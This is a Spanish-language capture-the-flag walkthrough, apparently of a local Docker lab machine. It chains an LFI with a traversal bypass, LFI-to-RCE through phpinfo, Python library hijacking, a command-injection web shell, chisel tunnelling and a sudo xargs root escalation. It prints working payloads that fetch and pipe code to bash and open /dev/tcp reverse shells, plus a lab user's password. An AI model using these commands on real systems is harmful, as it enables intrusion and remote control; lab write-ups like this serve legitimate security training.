Hacemos el escaneo de nmap:
![[Pasted image 20240508153623.png]]
Esto corre por el puerto 80:
![[Pasted image 20240508153638.png]]
Hacemos fuzzing y vemos un idol.html y un info.php:
![[Pasted image 20240508153721.png]]
Donde vemos esto:
![[Pasted image 20240508153737.png]]
Pero por aquí vemos que se pueden subir archivos:
![[Pasted image 20240508153817.png]]
Revisamos el otro directorio:
![[Pasted image 20240508153843.png]]
Abajo, tenemos un botón:
![[Pasted image 20240508153856.png]]
Donde se nos carga una ruta un poco extraña:
![[Pasted image 20240508153915.png]]
Intentamos usar el parámetro file para ver si podemos explotar un LFI pero no podemos:
![[Pasted image 20240508153946.png]]
Por lo que vamos a fuzzear este parámetro usando wfuzz:
```bash
wfuzz -c --hw=9 --hc=404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u 'http://172.17.0.2/clouddev3lopmentfile.php?FUZZ=/etc/passwd'
```
Y nos encuentra filename:
![[Pasted image 20240508154311.png]]
Vemos que cambia el mensaje, aunque tiene pinta de que haya alguna limitación:
![[Pasted image 20240508154346.png]]
Para hacerle un bypass, haremos lo siguiente:
```bash
http://172.17.0.2/clouddev3lopmentfile.php?filename=....//....//....//....//....//....//....//....//....//etc//passwd
```
![[Pasted image 20240508154452.png]]
Vamos a convertir un LFI en un RCE usando el siguiente exploit:
```bash
https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo
```
![[Pasted image 20240508155301.png]]
Dentro de este script hay que cambiar lo siguiente:
```php
<?php system("curl 172.17.0.1/s|bash");?>\r""" % TAG

/info.php

LFIREQ="""GET /clouddev3lopmentfile.php?filename=/....//....//....//....//....//....//%s HTTP/1.1\r

i = d.index("[tmp_name] =&gt")

i = d.find("[tmp_name] =&gt")
```
![[Pasted image 20240508161511.png]]
![[Pasted image 20240508161520.png]]
Y ahora tenemos que cambiar los variables de php, por lo que vamos a interceptar la petición en el /info.php:
![[Pasted image 20240508183332.png]]
Y cambiamos la petición a POST:
![[Pasted image 20240508183506.png]]


![[Pasted image 20240508161530.png]]
![[Pasted image 20240508161540.png]]
Nos ponemos en escucha con python compartiendo el siguiente archivo llamado s:
![[Pasted image 20240508161609.png]]
Lo ejecutamos:
![[Pasted image 20240508161621.png]]
Recibimos la petición:
![[Pasted image 20240508161630.png]]
Y la reverse shell:
![[Pasted image 20240508161639.png]]
Tenemos una nota para mario:
![[Pasted image 20240508161728.png]]
![[Pasted image 20240508161736.png]]
Tenemos la contraseña del usuario xerosec:
```bash
xerosec:megustaelfallout
```
Ejecutamos el comando sudo -l vemos que podemos ejecutar el siguiente script de python:
![[Pasted image 20240508161928.png]]
Y vemos que se encuentra en tmp, donde tenemos permisos de escritura, además de hacer uso de la librería hashlib:
![[Pasted image 20240508161955.png]]
Por lo que podemos explotar un python library hijacking, de tal forma que usando la librería os, podremos ejecutar una reverse shell:
```python
import os

os.system("bash -c 'bash -i >& /dev/tcp/192.168.0.20/333 0>&1'")
```
Ejecutamos el otro script como mario:
```bash
sudo -u mario /usr/bin/python3 /tmp/script.py
```
Y recibimos la shell como mario:
![[Pasted image 20240508162233.png]]
Dentro del directorio de mario, tenemos el siguiente mensaje:
![[Pasted image 20240508162413.png]]
En este punto, seguramente haya puertos funcionando de forma interna, pero no tenemos ni netstat ni ninguna herramienta para ver puertos internos, por lo que tenemos el siguiente comando para visualizar puertos internos dentro de /proc/net/tcp:
```bash
for port in $(cat /proc/net/tcp | awk '{print $2}' | awk '{print $2}' FS=":" | sort -u); do echo "[+] PORT $port -> $((0x$port))"; done
```
![[Pasted image 20240508162747.png]]
Por lo que ejecutamos el comando curl pasándolo por el puerto 9999:
```bash
curl http://localhost:999
```
Y nos pide pasar algún comando:
![[Pasted image 20240508162829.png]]
Por lo que ahora, si ejecutamos el comando id pasando el script de php, vemos que funciona:
```bash
curl http://localhost:9999/index.php?cmds4vi=id
```
![[Pasted image 20240508162949.png]]
Podemos ejecutar por aquí una reverse shell:
```bash
curl http://localhost:9999/index.php?cmds4vi=bash -i >& /dev/tcp/172.17.0.1/4444 0>&1
```
Pero no la recibimos del todo:
![[Pasted image 20240508163112.png]]
Por lo que vamos a reenviarnos este puerto de forma local:
```bash
curl -o chisel.gz -L https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
```
Y lo usamos de la siguiente forma:
```bash
./chisel client 172.17.0.1:8080 R:9999:127.0.0.1:9999

./chisel server --reverse 1234
```
![[Pasted image 20240508163840.png]]
Y ahora si que vemos este puerto 9999:
![[Pasted image 20240508163849.png]]
Y pegamos el payload:
```bash
http://localhost:9999/index.php?cmds4vi=bash -c "bash -i >%26 /dev/tcp/172.17.0.1/5555 0>%261"
```
![[Pasted image 20240508164434.png]]
![[Pasted image 20240508164442.png]]
Siendo el usuario s4vitar, vemos que podemos ejecutar xargs:
![[Pasted image 20240508164503.png]]
Escalamos a root:
```bash
sudo /usr/bin/xargs -a /dev/null bash
```
![[Pasted image 20240508164610.png]]
